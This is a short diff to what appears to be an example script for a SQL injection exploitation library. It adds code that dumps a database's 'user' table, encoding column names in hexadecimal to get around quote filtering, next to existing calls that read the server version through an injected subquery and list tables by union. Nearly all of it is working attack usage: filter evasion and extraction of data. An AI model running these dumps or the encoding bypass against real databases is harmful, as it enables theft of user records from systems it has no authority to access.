@@ -22,6 +22,9 @@ print(sf.read_string("(SELECT version())"))
 
 dd = DbDumper(sf)
 
+# dump the table. Because the quote are filtereds, we provide our columns via the hexa encoding technique
+print(dd.dump('user', dd.columns(SqliEncoder.str_to_hexa('user'))))
+
 print(dd.tables())
 
 print('-' * 15 + 'Find by union' + '-' * 15)
